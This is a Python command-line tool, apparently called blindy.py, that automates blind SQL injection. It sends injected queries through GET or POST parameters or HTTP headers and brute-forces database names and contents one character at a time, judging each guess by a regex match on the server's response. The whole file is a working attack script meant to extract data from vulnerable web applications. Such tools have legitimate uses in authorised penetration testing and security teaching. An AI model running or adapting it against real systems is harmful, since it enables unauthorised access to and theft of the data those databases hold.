import argparse
import json
import re
import requests
from urllib.parse import quote_plus as urlencode

NOTIN_PLACEHOLDER = 'NOTIN'
BRUTE_CHAR_PLACEHOLDER = '{}'

chars = 'abcdefghijklmnopqrstuwxyz-_0123456789'
notin = ['information_schema', 'mysql', 'performance_schema', 'sys']


def createBruteQuery(word, query):
    queryParts = query.split(BRUTE_CHAR_PLACEHOLDER)
    qpart2 = '' if len(queryParts) == 1 else queryParts[1]
    brutequery = queryParts[0] + word + qpart2

    return brutequery


def createWord(word, char):
    return word + char


def substitutePlaceholders(query):
    notinString = ''.join([("'" + name + "',") for name in notin]).rstrip(',')
    query = re.sub(NOTIN_PLACEHOLDER, notinString, query)

    return query


def inHTTPheader(payload, url):
    r = requests.get(url, headers=payload)

    return r.text


def inPOSTrequest(payload, url):
    r = requests.post(url, data=payload)

    return r.text


def inGETrequest(payload, url):
    r = requests.get(url, params=payload)

    return r.text

def preparePayload(parameters, phrase, encode):
    payload = {}

    for param in parameters:

        if (re.search('=', param)):

            param_splitted = re.split("=", param)
            if re.search(BRUTE_CHAR_PLACEHOLDER, param_splitted[1]):
                newParam = re.sub(BRUTE_CHAR_PLACEHOLDER, phrase, param_splitted[1])
            else:
                newParam = param_splitted[1]

            payload[param_splitted[0]] = urlencode(newParam) if encode == True else newParam

        else:
            payload[param] = urlencode(phrase) if encode == True else phrase

    return payload


def bruteforce(parameters, word, phrase, url, callback, pattern, positive, encode):

    if not re.search(BRUTE_CHAR_PLACEHOLDER, phrase):
        payload = preparePayload(parameters, phrase, encode)
        r = callback(payload, url)
        result = pattern.search(r)
        if (positive and result) or (not positive and not result):
            message = '\nFound: {}'.format(result)
            print(message)
            return result.group()

    for char in chars:

        newWord = createWord(word, char)
        query = substitutePlaceholders(phrase)
        brutequery = createBruteQuery(newWord, query)
        payload = preparePayload(parameters, brutequery, encode)

        r = callback(payload, url)
        result = pattern.search(r)

        if (positive and result) or (not positive and not result):
                return bruteforce(parameters, newWord, phrase, url, callback, pattern, positive, encode)

    message = '\nFound: {}'.format(word) if word is not '' else 'Nothing found :('
    print(message)
    return word



def runInjection(method, parameters, phrasesToTest, url, pattern, positive, encode):

    for phrase in phrasesToTest:

        phrase = phrase.rstrip('\n')
        print('Testing: {}'.format(phrase))

        if method == 'POST':
            bruteforce(parameters, '', phrase, url, inPOSTrequest, pattern, positive, encode)

        elif method == 'GET':
            bruteforce(parameters, '', phrase, url, inGETrequest, pattern, positive, encode)

        elif method == 'HEADER':
            bruteforce(parameters, '', phrase, url, inHTTPheader, pattern, positive, encode)


def parseArguments():
    parser = argparse.ArgumentParser(description="Run blind sql injection using brutforce",
                                     formatter_class=argparse.RawDescriptionHelpFormatter, epilog='''
    Example 1: python3 blindy.py -m POST -p query_param -p submit=1 -r \'Pattern\ to\ ignore\ result\' -u http://example.com/index.php -s blind
    Example 2: python3 blindy.py -m POST -p "query_param=login {}" -p submit=1 -r \'Pattern\ to\ ignore\ result\' -u http://example.com/index.php -s blind
    Example 3: python3 blindy.py -m POST -p username -p submit=1 -r 'Pattern\ to\ ignore\ result' -u http://example.com/login.php -s login
    ''')
    parser.add_argument('-f', '--filename', metavar='filename', default='default-queries.json',
                        type=argparse.FileType('r'),
                        help='File name for your commands in json format, defaults to default-queries.json')
    parser.add_argument('-m', '--method', metavar='method',
                        help='Where to inject (GET - get parameter/default, POST - post parameter, HEADER - header)')
    parser.add_argument('-p', '--parameter', metavar='name', required=True, action='append',
                        help='Name of parameter (for get - param name, post - param name, for header - name of header). If params need to have fixed value use -p submit=true')
    parser.add_argument('-r', '--pattern', metavar='pattern', required=True,
                        help='Regular expression/pattern - may be negative or positive. This means if the result of the successfull injection is not known - you should set the negative pattern (the one that is present if the injection is not successfull)')
    parser.add_argument('--positive', metavar='positive', action='store_const', const=True,
                        help='--positive means script will assume injection was successfull if pattern IS PRESENT in response. If you don\'t know what will appear in the response when the injection was successful, please do not use this flag and script will look for negative pattern.')
    parser.add_argument('-u', '--url', metavar='url', required=True, help='Url to test')
    parser.add_argument('-s', '--query_set', metavar='set_of_queries', default='blind',
                        help='Which set of queries to analyze from json file, for ex. login, blind. Default to blind.')
    parser.add_argument('-e', '--encode', metavar='encode', action='store_const', const=True, help='Url encode payload')
    args = parser.parse_args()

    return args


if __name__ == "__main__":
    args = parseArguments()
    
    jsonParsed = json.load(args.filename)

    runInjection(args.method, args.parameter, jsonParsed[args.query_set], args.url, pattern= re.compile(args.pattern), encode=args.encode, positive=args.positive)
